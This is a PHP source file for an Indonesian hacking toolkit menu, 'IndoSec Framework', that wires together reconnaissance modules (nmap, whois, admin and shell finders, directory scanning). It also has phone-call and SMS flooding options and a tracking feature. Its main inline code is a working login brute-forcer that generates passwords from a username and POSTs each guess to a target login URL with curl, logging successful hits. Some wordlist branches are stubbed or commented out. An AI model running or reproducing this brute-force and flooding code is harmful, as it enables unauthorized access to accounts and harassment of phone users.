<?php

/*
	IndoSec Coder Team @ OpenSoure Framework
*/


include 'bin/nmap.php';
include 'bin/dns_lookup.php';
include 'bin/adfin.php';
include 'bin/shellfinder.php';
include 'bin/subdo.php';
include 'bin/reverse.php';
include 'bin/whois.php';
include 'bin/host.php';
include 'bin/update.php';
include 'bin/encode.php';
include 'bin/bomb.php';
include 'bin/gps.php';
include 'bin/dirscanner.php';
include 'bin/downloadWlist.php';

include 'front/index.php';
include 'front/version.php';

error_reporting(0);

echo "\n[+] Checking for update.... ";
update($version);

printIndex();

echo " Use ?? : => ";
$input = trim(fgets(STDIN));
echo " : => Options ".$input."\n\n";

if($input == '--help'){
	echo "Makanya Di Baca Pake Mata ^_^ !!!\n";
}elseif($input == '--version'){
	echo $version;
}elseif($input == '--about'){
	print "
Author : \n
{ IndoSec Coder Team } @ ".date('Y')."\n
	";
}
// nmap
elseif ($input == '1') {
	echo " Domain/Ip : \n => ";
	$input2 = trim(fgets(STDIN));
	nmap($input2);
}
elseif ($input == '2') {
	echo " Domain/Ip : \n => ";
	$input2 = trim(fgets(STDIN));
	dnslookup($input2);
}
elseif ($input == '3') {
	echo " Domain/Ip : \n => ";
	$input2 = trim(fgets(STDIN));
	host($input2);
}
elseif ($input == '4') {
	echo " Domain/Ip : \n => ";
	$input2 = trim(fgets(STDIN));
	reverse($input2);
}
elseif ($input == '5') {
	echo " Domain/Ip : \n => ";
	$input2 = trim(fgets(STDIN));
	whois($input2);
}elseif ($input == '6') {
	echo " Domain ex(https://google.com) : \n => ";
	$input2 = trim(fgets(STDIN));
	adfind($input2);
}elseif($input == 7){
	
	echo " Domain ex(https://google.com) : \n => ";
	$input2 = trim(fgets(STDIN));
	dirscanner($input2);

}elseif ($input == '8') {
	echo " Proses Pembuatan ! ";
}
elseif ($input == '9') {
	echo "\n URL ex.(https://indosec.com/admin/login.php) \n => : ";
	$domain = trim(fgets(STDIN));
	
	echo "\n\n Username ex.(admin, TiaRiska, Brilly4n) \n => : ";
	$user = trim(fgets(STDIN));

	echo "\n\n Form Data ex.(username=*USER*&password=*PASS*&submit=1) \n => : ";
	$data = trim(fgets(STDIN));

	echo "\n\n Tulisan Error ??? => : ";
	$err = trim(fgets(STDIN));

	echo "\n\n (1) Wordlist Sendiri \n (2) Awto Generate Password \n (3) Awto Download Wordlist \n (4) Download Wordlist \n\n => : ";
	$pass = trim(fgets(STDIN));

	$target = '';
	if ($pass == 1) {
		echo "\n Masukan File Wordlist => : ";
		$pass = trim(fgets(STDIN));

		$files = file_get_contents($pass);
		$extract = explode("\n", $files);

		foreach ($extract as $key) {
			$target1 = '';
			$target2 = '';
			$target1 .= str_replace('*USER*', 'tayo', 'username=*USER*&password=*PASS*&login=1');
			// $target2 .= str_replace('*PASS*', $key, $target1);
			echo $key."asdasd\n";
			// $ch = curl_init();
			// curl_setopt($ch, CURLOPT_URL, $domain);
			// curl_setopt($ch, CURLOPT_POST, true);
			// curl_setopt($ch, CURLOPT_POSTFIELDS, $target2);
			// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			// $a = curl_exec($ch);
			
			// if (preg_match("/$err/", $a)) {
			// 	echo "[-] $key => Password Tidak DiTemukan ! \n";
			// }else{
			// 	echo "\n[+] $key => Password DiTemukan !!! \n\n";
			// }
		}
	}elseif($pass == 2){
		echo "Membuat Password Otomatis .... ";
		// $data = 'username=*USER*&password=*PASS*&submit=1';
		$array = array(
			$user.'_admin',$user.'_123',$user.'_112233',$user.'_ADMIN',$user.'_admin123',$user.'_2018',$user.'_admin321',$user.'_321',$user.'_132',$user.'_admin2018',$user.'_2015',$user.'_2016',$user.'_2017',$user.'_4dm1n',$user.'_123_admin',$user.'_admin_123',$user.'_321',$user.'_332211',$user.'_admin',$user,$user.'_login',$user.'_user',$user.'_user123',$user.'_user1',$user.'_user2',$user.'_user3',$user.'_user123',$user.'_users',$user.'_users1',$user.'_users2',$user.'_users3',$user.'_users123',$user.'_users321',$user.'_password',$user.'_password123',$user.'_pass',$user.'_pass321',$user.'_pass123',$user.'_PASS',$user.'_p4ss',$user.'_','password','pass123','pass','p4ssw0rd','admin','admin123','admin321','admin2018','4dm1n','admin_123','admin_admin','admin_user','pass','123456','1234567890'
		);
		foreach ($array as $key) {
			$target2 = '';
			$target1 = str_replace('*USER*', $user, $data);
			$target2 .= str_replace('*PASS*', $key, $target1);

			// echo $target2;
			// $pass = 'username='.$user.'&password='.$key.'&login=1';
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $domain);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $target2);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			$a = curl_exec($ch);
			
			if (preg_match("/$err/", $a)) {
				echo "[-] $key => Password Tidak DiTemukan ! \n";
			}else{
				echo "\n[+] $key => Password DiTemukan !!! \n\n";
				$result = "[+] $key => Password DiTemukan !!!";
			}	
		}
		$file = 'result.txt';
	$isi = "
==============>{ IndoSec Framework }<================\n\n
= Result Info : \n
= Waktu : ".date('d-m-Y H:i:s')." \n         
= Domain : ".$domain." \n
= Tools : login BruteForce
======================================================
".$result."	
";

	$open = fopen($file, 'a');
	fwrite($open, $isi);
	fclose($open);

	touch($file);
	print $result;
	echo "\n\n [+] Berhasil Membuat File => ".$file."\n\n";
		

	}elseif($pass == 3){
		echo "\n\n Download yang Mana mahanx ??? \n (1) Wordlist Mini \n (2) Wordlist Normal \n (3) Wordlist Extra \n => : ";
		$pass = trim(fgets(STDIN));
	}elseif($pass == 4){
		// echo "\n Link Wordlist => : ";
		// $link = trim(fgets(STDIN));

		// echo "\n\n [+] Downloading Wordlist ...";

		// DownloadWordlist($link);

		$files = file_get_contents('WordlistSendiri.txt');
		$extract = explode("\n\r", $files);

		foreach ($extract as $key) {
			echo $key."\n";
		}

	}else{
		exit();
	}

}elseif ($input == 20) {
	
	echo " (1) Create Tracking or (2) Get Tracking : \n => ";
	$input = trim(fgets(STDIN));

	if ($input == 1) {
		
		echo "\nMembuat Kunci ID : \n => Loading.... \n";
		$rand = rand(6,1234567890);
		echo "\n [+] Kunci ID Kamu => : ".$rand;

		track($rand);

	}elseif($input == 2){
		echo " Masukan Kunci ID Kamu  : \n => ";
		$input2 = trim(fgets(STDIN));
		get_track($input2);
	}else{
		exit();
	}
}elseif ($input == '21') {
	
	echo "\n\n[-] Masih Di Build Manx !!!";
}elseif($input == 11){
	echo "Select an option..\n\n";
    echo "    1) Encode Md5\n";
    echo "    2) Encode Base64\n";
    echo "    3) Encode Sha1\n";
	echo "    4) Encode Md4\n";
	echo "    5) Encode Semua type\n";
    echo "    x) Exit\n";
    echo "Pilih Type Encode : => ";
    $input2 = trim(fgets(STDIN));
    encode($input2);

    // BOMB Telepon
}elseif($input == 13){
	
	echo "\n[+] Masukan Nomor : => ";

    $input2 = trim(fgets(STDIN));
    call($input2);
}elseif($input == 14){
	
	echo "\n[+] Masukan Nomor : => ";

    $input2 = trim(fgets(STDIN));
    sms($input2);
}elseif($input == 23){
	
	echo " Domain ex(https://google.com) : \n => ";
	$input2 = trim(fgets(STDIN));
	shell_finder($input2);

}else{
	echo "Nggk Ada, Kok Maksain sihhh !!!\n\n";
	exit();
}
?>